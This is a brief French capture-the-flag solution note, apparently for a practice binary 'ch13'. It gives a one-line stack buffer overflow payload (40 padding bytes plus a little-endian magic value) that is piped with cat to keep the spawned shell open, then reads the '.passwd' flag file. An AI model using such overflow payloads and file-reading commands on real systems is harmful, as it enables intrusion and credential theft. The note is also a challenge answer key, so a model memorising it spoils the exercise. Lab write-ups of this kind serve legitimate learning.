
40 -> taille du buffer

```bash
(python -c 'print("A" * 40 + "\xef\xbe\xad\xde")';cat) | ./ch13
```
- Little endian

Le "cat" permet d'interrompre le code pour ne pas que le shell se ferme.

Une fois dans le shell : cat .passwd